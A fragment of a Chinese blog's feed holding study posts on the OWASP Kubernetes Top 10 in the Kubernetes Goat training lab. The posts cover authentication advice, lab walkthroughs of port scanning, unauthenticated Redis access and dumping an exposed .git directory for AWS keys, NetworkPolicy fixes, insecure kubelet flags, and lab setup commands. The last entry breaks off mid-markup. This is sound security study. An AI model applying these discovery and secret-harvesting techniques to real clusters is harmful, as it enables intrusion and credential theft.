&lt;p&gt;最近阅读了一本22年的书《分布式系统架构与开发》，作者是郑天民。基于该书的内容重新整理关于一下微服务技术及其生态的&quot;思维导图&quot;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/重新审视微服务/shanqiu.png&quot; style=&quot;zoom:70%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/tags/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    <category term="微服务技术" scheme="https://lzwgiter.github.io/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>K8s攻防之OWASP-K8S-TOP10（下）</title>
    <link href="https://lzwgiter.github.io/posts/85bf5302.html"/>
    <id>https://lzwgiter.github.io/posts/85bf5302.html</id>
    <published>2023-10-04T04:01:36.056Z</published>
    <updated>2023-10-09T10:55:22.211Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>紧接<ahref="https://www.f10at.cn/posts/8aa36aba.html">上一篇</a>，继续学习剩下的漏洞类型。(ps：上一次的环境有一些问题，我重新用ubuntu20搭建了。如果也有学习这块但嫌环境麻烦的小伙伴，可以私信我要虚拟机，联系方式见头像下方，一起学习和讨论。</p><p>剩下的K5-K10主要是开发人员在k8s网络配置、资源配置文件、开发程序打包时存在的一些<strong>配置问题</strong>。</p><p><img src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917222234007.png" style="zoom:60%;" /></p></blockquote><span id="more"></span><h2 id="k06-broken-authentication-mechanisms">K06: Broken AuthenticationMechanisms</h2><h3 id="定义">定义</h3><p>k8s中对于资源的访问都是需要apiserver的统一认证的，如下图所示，通常有两种访问形式：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/kubernetes-auth.png" /></p><ul><li>直接访问</li><li>pod内访问</li></ul><p>前者通常是开发人员需要调试程序的场景，可以使用包括OpenID Connect(OIDC)、证书等方法。而后者通常上是使用一个ServiceAccountToken进行访问。然而<strong>上述方式在使用的时候有一些注意事项和最佳实践</strong>。</p><blockquote><p><strong>避免使用证书作为认证的手段</strong></p></blockquote><p>虽然使用证书向k8sapi认证很方便，但因为在当前k8s中，API无法撤销一个证书，因而客户端私钥的泄露会导致很大的问题，且证书的配置、签名和分发也非常麻烦。因此建议不要将证书作为主要的认证手段。</p><blockquote><p><strong>不要引入自己定义的认证方式</strong></p></blockquote><p>尽量使用广泛使用的、支持的认证方式。</p><blockquote><p><strong>必要时使用多因子认证</strong></p></blockquote><p>对于人直接访问的情况，采用多因子认证手段，额外添加如OIDC等认证方式辅助。</p><p>这里也有一个攻击案例，由于开发人员将<code>.kubeconfig</code>文件泄露到了github上，其中包含了访问k8s的令牌，当攻击者从github上发现该令牌后，由于该开发人员的k8s集群只设置了使用证书的认证方式，没有第二个辅助认证方式，因而导致了直接被访问的情况。</p><blockquote><p><strong>不要从集群外使用ServiceAccount的Token</strong></p></blockquote><p>默认情况下，从集群外部访问所使用的SAToken是由<code>Kubernetes Secret</code>生成的且<strong>没有过期时间</strong>，对集群带来了一定风险。因为推荐使用<code>kubectl create token</code>添加<code>--duration flag</code>来生成Token。</p><blockquote><p>使用短期(short-lived)令牌验证用户和外部服务</p></blockquote><p>很好理解，令牌存活时间越短，泄漏后带来的潜在威胁也就越小。</p><h3id="对应k8s-goat场景rbac-least-privileges-misconfiguration">对应k8s-goat场景：RBACleast privileges misconfiguration</h3><blockquote><p>本场景与K03场景相同，可以参考上篇内容：<ahref="https://www.f10at.cn/posts/8aa36aba.html#/k03-overly-permissive-rbac">K03-overly-permisive-rbac-K8s攻防之OWASP-K8S-TOP10（上）· f10@t's blog (f10at.cn)</a></p><p>该攻击方法从战术上属于<code>Credential Access</code>，技术上包含<code>List K8S secrets</code>和<code>Container service account</code>。</p></blockquote><p>这里在K06中想要强调的，我理解是：</p><ol type="1"><li>使用证书作为认证手段，当我们拥有了一个pod的命名执行后，就意味着私钥已经泄露了。若仅使用证书作为主要的认证手段，则在该请款下，k8sAPI无法撤销一个证书。</li><li>没有设置合理的令牌存活时间。</li></ol><h3 id="参考学习">参考学习</h3><ul><li><ahref="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-16/rbac-least-privileges-misconfiguration-in-kubernetes-cluster/welcome">⎈RBAC least privileges misconfiguration | Kubernetes Goat(madhuakula.com)</a></li><li><ahref="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K06-broken-authentication">K06:Broken Authentication | OWASP Foundation</a></li></ul><h2 id="k07-missing-network-segmentation-controls">K07: Missing NetworkSegmentation Controls</h2><h3 id="定义-1">定义</h3><blockquote><p>kubernetes networking is flat by default. Meaning that, when noadditional controls are in place any workload can communicate to anotherwithout constraint.</p></blockquote><p>k8s默认情况下，各个pod之间的流量都是打通的，没有任何限制，因而攻击者就可以在这个"内网"中肆意妄为了。</p><p>为了解决上述问题，我们需要网络分割（<em>networksegmentation</em>）来限制攻击者的活动空间。有如下四种可行的方式：</p><ul><li>k8s原生方案（<em>Native Controls</em>）：<ul><li>Multi-Cluster：直接从真是网络上进行划分，将集群进行隔离，显然是可行的，但是会增大工程复杂度。</li><li>NetworkPolicies：<strong>成熟做法</strong>，通过编写配置文件即可实现细颗粒度的流量筛选。下面学习该方式。</li></ul></li><li>服务网格（ServiceMesh）：由于服务网格方案如Istio中，将熔断、限流等流量控制方面的措施与上层业务解耦下沉，因而也可以基于该方案进行流量筛选。如Istio中的<code>AuthorizationPolicy</code>资源。</li><li>CNI插件</li></ul><h3id="对应k8s-goat场景kubernetes-namespaces-bypass">对应k8s-goat场景：Kubernetesnamespaces bypass</h3><p>下面是官方的攻击示意图。初步判断低手通过切换命名空间，并利用redis的6379端口访问到了其中的的资源。</p><blockquote><p>该场景攻击涉及到端口扫描和访问其他命名空间资源，分别涉及战术<code>Discovery</code>中的<code>Network Mapping</code>技术，以及战术<code>Lateral Movement</code>中的<code>Cluster internal networking</code>技术。</p></blockquote><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/scenario-11-e55c9b80c23a981a44e3ab1175875d2a.png" /></p><p>首先我们需要启动一个默认命名空间内的容器用于提供命令执行：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231004191414600.png" /></p><p>我们的目标是访问<code>secure-middleware</code>命名空间内一个名为<code>cache-store</code>的pod中的<code>k8s_goat_flag</code>。</p><h3 id="利用">利用</h3><p>那其实这块本质上就是web中的信息收集了，我们需要找他对应的目标以及其上6379redis服务并访问。先看看ip：</p><p><img src="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231004192101908.png" style="zoom:60%;" /></p><p>ok，所在网段10.10.12.0/24，且提前预备好了nmap，那我们第一步用ping做主机存活判断：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231004192640765.png" /></p><p>找到了该服务所在ip为10.10.12.5，第二步骤判断其开放端口：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231004192938315.png" /></p><p>发现redis服务，那最经典的就是redis未授权访问，看看有没有这个问题：</p><p><img src="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231004193405874.png" style="zoom:60%;" /></p><p>6，且可以看到名为<code>SECRETSTUFF</code>的键，查看其内容：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231004193528521.png" /></p><p>好吧。那怎么解决这个问题呢？</p><h3 id="问题原因">问题原因</h3><p>从利用过程中可以看出来，默认情况下k8s没有对网络流量进行过滤，从而导致了我们可以实施发现、利用和访问的操作。</p><p>因此我们需要利用<strong>CNI</strong>设置<strong>网络策略（NetworkPolicy）</strong>以实现网络边界的效果。在官方的另一个场景中，展示了如何创建<code>NetworkPolicy</code>文件，下面是补充内容：</p><h3id="补充k8s-goat对应场景secure-network-boundaries-using-nsp">补充：k8s-goat对应场景：SecureNetwork Boundaries using NSP</h3><p>下面我们写一个网络策略配置文件以解决上面场景中存在的问题。（ps：当时，讲道理其实解决redis问题，这里我们主要关注于网络。官方的指导文档：<ahref="https://kubernetes.io/docs/concepts/services-networking/network-policies/">NetworkPolicies | Kubernetes</a>。</p><blockquote><p>大前提，你所用的网络插件必须支持NetworkPolicy，这里我用的是Flannel。</p></blockquote><h4 id="预备知识">预备知识</h4><p>k8s的NSP可以使用如下三元素标识一个<strong>对象（entity）</strong>的策略：</p><ul><li>可允许访问本地资源的pod（除了自己）</li><li>可允许访问本地资源的Namespace</li><li>IP黑名单</li></ul><p>从上到下分别对应：<strong>Pod</strong>、<strong>Namespace</strong>、<strong>IP</strong>三个范畴。前两者可以通过<code>Selector</code>来定义，IP则使用CIDR范围来标识。</p><p>在编写具体配置时，我们使用的是<code>ingress</code>和<code>egress</code>两个关键字，分别代表针对相对当前对象的<strong>流入</strong>和<strong>流出</strong>的流量的策略，且都是白名单，即只有这两类字段下类型的流量是允许的。</p><p>下面是k8s官方的一个例子及含义</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">NetworkPolicy</span>    <span class="comment"># 这是一个网络策略的配置文件</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">test-network-policy</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">podSelector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">role:</span> <span class="string">db</span></span><br><span class="line">  <span class="attr">policyTypes:</span><span class="comment"># 所涉及的、将要被定义的流量类型。一共就这两种</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Ingress</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Egress</span></span><br><span class="line">  <span class="attr">ingress:</span><span class="comment"># 对于进入的流量而言：</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">from:</span><span class="comment"># from字段打头，可以定义如上所述的三种类型</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">ipBlock:</span><span class="comment"># 允许进入的CIDR</span></span><br><span class="line">            <span class="attr">cidr:</span> <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line">            <span class="attr">except:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="number">172.17</span><span class="number">.1</span><span class="number">.0</span><span class="string">/24</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">namespaceSelector:</span><span class="comment"># 允许进入的Namespace</span></span><br><span class="line">            <span class="attr">matchLabels:</span></span><br><span class="line">              <span class="attr">project:</span> <span class="string">myproject</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">podSelector:</span><span class="comment"># 允许进入的Pod</span></span><br><span class="line">            <span class="attr">matchLabels:</span></span><br><span class="line">              <span class="attr">role:</span> <span class="string">frontend</span></span><br><span class="line">      <span class="attr">ports:</span><span class="comment"># 上述策略所针对的本地端口</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">          <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">  <span class="attr">egress:</span><span class="comment"># 对于流出的流量而言</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">to:</span><span class="comment"># to字段打头</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">ipBlock:</span><span class="comment"># 允许流出的CIDR</span></span><br><span class="line">            <span class="attr">cidr:</span> <span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">/24</span></span><br><span class="line">      <span class="attr">ports:</span><span class="comment"># 上述策略所针对的远程端口</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">          <span class="attr">port:</span> <span class="number">5978</span></span><br></pre></td></tr></table></figure><h4 id="解决k07场景中存在的问题">解决K07场景中存在的问题</h4><p>下面我们写一个网络策略文件，禁止任何外部流量访问本地的redis服务：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">NetworkPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">solve-k07-redis-problem</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">secure-middleware</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">podSelector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">cache-store</span></span><br><span class="line">  <span class="attr">policyTypes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Ingress</span></span><br><span class="line">  <span class="attr">ingress:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">from:</span> <span class="comment"># 啥都不写，即没有允许的</span></span><br><span class="line">      <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">          <span class="attr">port:</span> <span class="number">6379</span></span><br></pre></td></tr></table></figure><p>应用到网络中：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231004222550844.png" /></p><p>删除k07中的pod，自动重启后即可发现已经无法访问这个端口了，从而实现网络隔离的效果。</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231004223131691.png" /></p><p>这里有一些可以参考使用的网路配置文件：<ahref="https://github.com/ahmetb/kubernetes-network-policy-recipes">ahmetb/kubernetes-network-policy-recipes:Example recipes for Kubernetes Network Policies that you can just copypaste (github.com)</a></p><h3 id="参考学习-1">参考学习</h3><ul><li><ahref="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K07-network-segmentation">K07:Network Segmentation | OWASP Foundation</a></li><li><ahref="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-11/kubernetes-namespaces-bypass-from-kubernetes-cluster-pod/welcome">⎈Kubernetes namespaces bypass | Kubernetes Goat (madhuakula.com)</a></li><li><ahref="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-20/secure-kubernetes-using-network-security-policy/welcome">⎈Secure Network Boundaries using NSP | Kubernetes Goat(madhuakula.com)</a></li><li><ahref="https://kubernetes.io/docs/concepts/services-networking/network-policies/">NetworkPolicies | Kubernetes</a></li><li><ahref="https://github.com/ahmetb/kubernetes-network-policy-recipes">ahmetb/kubernetes-network-policy-recipes:Example recipes for Kubernetes Network Policies that you can just copypaste (github.com)</a></li></ul><h2 id="k08-secrets-management-failures">K08: Secrets ManagementFailures</h2><h3 id="定义-2">定义</h3><p>这个比较好理解，k8s允许我们定义一些比如<code>Secret</code>类型的<strong>隐私资源</strong>，如下图中的数据库用户名和密码、Secret资源。</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231004225931180.png" /></p><p>辣肯定不能靠k8s默认的base64这种简单的编码来存储了。因此我们需要保证配置文件中权限的最小化原则，并打开日志记录。</p><h3id="对应k8s-goat场景sensitive-keys-in-codebases">对应k8s-goat场景：Sensitivekeys in codebases</h3><p>下面是官方的攻击示意图，初步判断是应用程序在打包时，误将.git这样的敏感目录打包了，泄露了提交历史和文件内容。</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/scenario-1-a9eae5ef2d147efb1ddd430132ef3498.png" /></p><p>访问对应端口：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231004230629333.png" /></p><p>我们的目标是找到<code>aws_access_key_id</code>、<code>aws_secret_access_key</code>以及<code>k8s-goat-FLAG</code>。</p><h3 id="利用-1">利用</h3><p>其实就是web里的git泄露嘛，直接上工具<ahref="https://github.com/arthaud/git-dumper">git-dumper</a>，然后就可以使用git命令查看了：</p><p><img src="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231004232353575.png" style="zoom:60%;" /></p><p>可以看到有一个分支注释中写了添加变量的字样，切换过去看一下：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231004232829994.png" /></p><h3 id="问题原因-1">问题原因</h3><p>emmmm，说白了就是打包程序的时候眼窝睁大点就好了。</p><h3 id="参考学习-2">参考学习</h3><ul><li><ahref="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-1/sensitive-keys-in-codebases-in-kubernetes-containers/welcome">⎈Sensitive keys in codebases | Kubernetes Goat (madhuakula.com)</a></li><li><ahref="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K08-secrets-management">K08:Secrets Management | OWASP Foundation</a></li></ul><h2 id="k09-misconfigured-cluster-components">K09: Misconfigured ClusterComponents</h2><h3 id="定义-3">定义</h3><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231005122423618.png" /></p><p>如上图所示，一些错误的<strong>组件配置</strong>可能会导致k8s集群安全性的大大降低，涉及组件如APIServer、Kubelet、ETCD等。OWASP给了一些错误的配置示例：</p><blockquote><p><strong>Kubelet</strong></p></blockquote><p><code>--anonymous-auth=true</code></p><p>通常情况下，如使用kubectl命令时，我们需要认证才能请求kubelet，而若在kubelet服务启动时带上了该参数，那么任意的人都可以请求kubelet了，这显然是不安全的。</p><p><code>--authorization-mode=AlwaysAllow</code></p><p>同理，将AuthZ设置为AlwayAllow也将允许匿名的API访问。</p><blockquote><p><strong>ETCD</strong></p></blockquote><p>etcd中以<strong>键值对</strong>的方式、<strong>中心化地</strong>保存了k8s集群的数据，因而也要保护其安全。</p><blockquote><p><strong>Kube-apiserver</strong></p></blockquote><p>我理解主要是做好认证，毕竟它是K8S API请求的入口。</p><p>针对上述问题，可以选择使用<ahref="https://www.cisecurity.org/benchmark/kubernetes">CIS KubernetesBenchmarks (cisecurity.org)</a>进行扫描以检测错误的配置文件。</p><blockquote><p>This CIS Benchmark is the product of a community consensus processand consists of secure configuration guidelines developed forKubernetes. ——cisecurity.org</p></blockquote><h3id="对应k8s-goat场景kubeaudit---audit-kubernetes-clusters">对应k8s-goat场景：KubeAudit- Audit Kubernetes clusters</h3><p>这部分主要是借助开源工具<code>kubeaudit</code>对集群进行安全审计。</p><p>工具链接：<ahref="https://github.com/Shopify/kubeaudit">Shopify/kubeaudit: kubeaudithelps you audit your Kubernetes clusters against common securitycontrols (github.com)</a></p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231008182433874.png" /></p><h3 id="参考学习-3">参考学习</h3><ul><li><ahref="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-17/auditing-the-kubernetes-cluster-using-kubeaudit/welcome">⎈KubeAudit - Audit Kubernetes clusters | Kubernetes Goat(madhuakula.com)</a></li><li><ahref="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K09-misconfigured-cluster-components">K09:Misconfigured Cluster Components | OWASP Foundation</a></li></ul><h2 id="k10-outdated-and-vulnerable-kubernetes-components">K10: Outdatedand Vulnerable Kubernetes Components</h2><h3 id="定义-4">定义</h3><blockquote><p>该场景因为利用的helm v2，现行的是v3。简单参考即可。</p></blockquote><p>其实就是使用了带有漏洞的组件，如下图示意：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（下）/image-20231008184602759.png" /></p><h3 id="参考学习-4">参考学习</h3><ul><li><ahref="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-9/helm-v2-tiller-to-pwn-kubernetes-cluster-takeover/welcome">⎈Helm v2 tiller to PwN the cluster - Deprecated | Kubernetes Goat(madhuakula.com)</a></li></ul><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;紧接&lt;a
href=&quot;https://www.f10at.cn/posts/8aa36aba.html&quot;&gt;上一篇&lt;/a&gt;，继续学习剩下的漏洞类型。(ps：上一次的环境有一些问题，我重新用ubuntu20搭建了。如果也有学习这块但嫌环境麻烦的小伙伴，可以私信我要虚拟机，联系方式见头像下方，一起学习和讨论。&lt;/p&gt;
&lt;p&gt;剩下的K5-K10主要是开发人员在k8s网络配置、资源配置文件、开发程序打包时存在的一些&lt;strong&gt;配置问题&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917222234007.png&quot; style=&quot;zoom:60%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="云安全" scheme="https://lzwgiter.github.io/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Kubernete" scheme="https://lzwgiter.github.io/tags/Kubernete/"/>
    
    <category term="云安全" scheme="https://lzwgiter.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>K8s攻防之OWASP-K8S-TOP10（上）</title>
    <link href="https://lzwgiter.github.io/posts/8aa36aba.html"/>
    <id>https://lzwgiter.github.io/posts/8aa36aba.html</id>
    <published>2023-09-16T07:25:21.000Z</published>
    <updated>2023-10-04T15:37:14.578Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>之前入门学习了k8s集群环境的搭建和基本概念包括框架、网络模型，部署与动态扩展服务的方法：</p><ul><li><a href="https://www.f10at.cn/posts/eed4a979.html">Kubernetes集群环境搭建使用及问题记录（一）</a></li><li><ahref="https://www.f10at.cn/posts/a08eb123.html">Kubernetes-集群环境搭建使用及问题记录（二）</a></li><li><ahref="https://www.f10at.cn/posts/ed901271.html">Kubernetes-集群环境搭建使用及问题记录（三）</a></li></ul><p>回归安全的课题上来，云安全本质上是传统安全在云原生环境下的重新思考。作为业内事实标准，k8s可以提供服务管理、扩容等诸多功能，是提供云原生能力的基石。</p><p>因此后面计划首先学习云安全分支下的k8s安全，并同时学习docker中的常见安全问题。这篇先学习<ahref="https://owasp.org/www-project-kubernetes-top-ten/">OWASPKubernetes Top Ten</a>的前五个。</p><p><img src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917222234007.png" style="zoom:60%;" /></p></blockquote><span id="more"></span><h1 id="k8s环境准备">K8S环境准备</h1><p>仍然使用之前博客中搭建好的环境，一共三台CentOS7的虚拟机，其IP和角色分别如下：</p><ul><li>10.10.10.101（Master）</li><li>10.10.10.102（node-1）</li><li>10.10.10.103（node-2）</li></ul><blockquote><p>这里有一个小插曲，打开后发现我的kubelet服务没有起来，提示客户端证书过期了</p></blockquote><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230916152715777.png" /></p><p>用<code>kubeadm</code>检查一下，还真是</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230916153006771.png" /></p><p>解决方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份旧证书</span></span><br><span class="line">cd /etc/kubernetes/pki/</span><br><span class="line">mkdir 2023-09-16-pki-backup</span><br><span class="line">mv *.key *.crt sa.pub etcd/ 2023-09-16-pki-backup/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新生成证书</span></span><br><span class="line">kubeadm init phase certs all</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份历史配置文件</span></span><br><span class="line">cd /etc/kubernetes</span><br><span class="line">mkdir 2023-09-16-k8s-backup</span><br><span class="line">mv  *.conf 2023-09-16-k8s-backup/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新生成配置文件</span></span><br><span class="line">kubeadm init phase kubeconfig all</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新管理员配置文件以确保kubectl的正常使用</span></span><br><span class="line">cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br></pre></td></tr></table></figure><p>这时候查看<code>kubelet</code>状态就恢复了：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230916162300287.png" /></p><p>However，这时候从节点还是g的：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230916162543423.png" /></p><p>这是因为这两节点的<code>kubelet.conf</code>还没有更新，下面做更新操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">筛选Kube-scheduler的容器</span></span><br><span class="line">docker ps -a | grep kube-scheduler | awk ‘&#123;print $1&#125;’</span><br><span class="line">docker rm -f 上述容器</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">等待重启状态恢复到1/1</span></span><br><span class="line">kubectl get pods -n kube-system | grep scheduler</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分别生成从节点的kebelet.conf文件（版本号、节点名称需要改成你自己的）并拷贝</span></span><br><span class="line">kubeadm init --kubernetes-version=v1.22.2 phase kubeconfig kubelet --node-name k8s-node01 --kubeconfig-dir ~/</span><br><span class="line">scp ~/kubelet.conf k8s-node01:/etc/kubernets/</span><br><span class="line"></span><br><span class="line">kubeadm init --kubernetes-version=v1.22.2 phase kubeconfig kubelet --node-name k8s-node01 --kubeconfig-dir ~/</span><br><span class="line">scp ~/kubelet.conf k8s-node02:/etc/kubernets/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启所有虚拟机</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>然后就恢复了：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917143430965.png" /></p><blockquote><p>这个问题属于<strong>K8s证书过期</strong>的日常问题，这里我是手动解决的。查阅资料过程中发现也有其它自动化解决手段，什么自动证书轮转，这里暂时不继续探究。</p></blockquote><h1 id="kubernetes-goat环境搭建">Kubernetes goat环境搭建</h1><ol type="1"><li><p>安装k8s包管理器-<ahref="https://helm.sh/">Helm</a>，类似apt和yum，用于向K8s中安装云原生应用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用国内的helm charts源</span></span><br><span class="line">helm repo add appstore https://charts.grapps.cn</span><br></pre></td></tr></table></figure></li><li><p>克隆k8s-goat</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/madhuakula/kubernetes-goat.git</span><br><span class="line">cd kubernetes-goat</span><br><span class="line">bash setup-kubernetes-goat.sh</span><br></pre></td></tr></table></figure></li></ol><p>安装结果如下：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917152553267.png" /></p><p>稍等一会儿后，可以看到当前活动的pods：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917164629557.png" /></p><p>最后运行<code>access-kubernetes-goat.sh</code>脚本即可完成环境搭建：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917164804225.png" 